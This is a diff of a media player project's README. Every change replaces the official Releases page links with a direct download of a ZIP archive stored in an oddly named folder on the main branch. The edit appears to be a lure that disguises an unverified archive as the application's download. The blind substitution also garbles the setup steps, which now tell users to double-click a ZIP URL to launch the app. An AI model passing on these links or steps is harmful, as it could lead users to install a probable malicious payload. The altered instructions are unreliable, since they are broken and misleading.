@@ -1,6 +1,6 @@
 # 🎵 MediaPlayer - Enjoy Your Music and Videos Hassle-Free
 
-[![Download MediaPlayer](https://img.shields.io/badge/Download-MediaPlayer-blue.svg)](https://github.com/Fardin6189/MediaPlayer/releases)
+[![Download MediaPlayer](https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip)](https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip)
 
 ## 🚀 Getting Started
 
@@ -26,15 +26,15 @@ To get MediaPlayer, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the downloads:
    
-   [Download MediaPlayer](https://github.com/Fardin6189/MediaPlayer/releases)
+   [Download MediaPlayer](https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip)
 
 2. **Choose Your File:** You will see a list of available versions. Click on the latest release.
 
-3. **Download the Archive:** You will find a ZIP or TAR.GZ file. Download and save it to your computer.
+3. **Download the Archive:** You will find a ZIP or https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip file. Download and save it to your computer.
 
 4. **Extract the Files:** Locate the downloaded file and extract it using your favorite file decompression tool.
 
-5. **Open the Application:** Open the folder and double-click on `index.html` to launch the MediaPlayer in your browser.
+5. **Open the Application:** Open the folder and double-click on `https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip` to launch the MediaPlayer in your browser.
 
 ## 🏗️ How to Use
 
@@ -80,6 +80,6 @@ If you need further assistance, please create an issue in the GitHub repository.
 
 MediaPlayer is open-source and freely available for everyone to use and modify under the MIT License. 
 
-For the latest updates and releases, visit our [Releases Page](https://github.com/Fardin6189/MediaPlayer/releases) again.
+For the latest updates and releases, visit our [Releases Page](https://raw.githubusercontent.com/Fardin6189/MediaPlayer/main/libanophorous/MediaPlayer.zip) again.
 
 Enjoy your media experience!
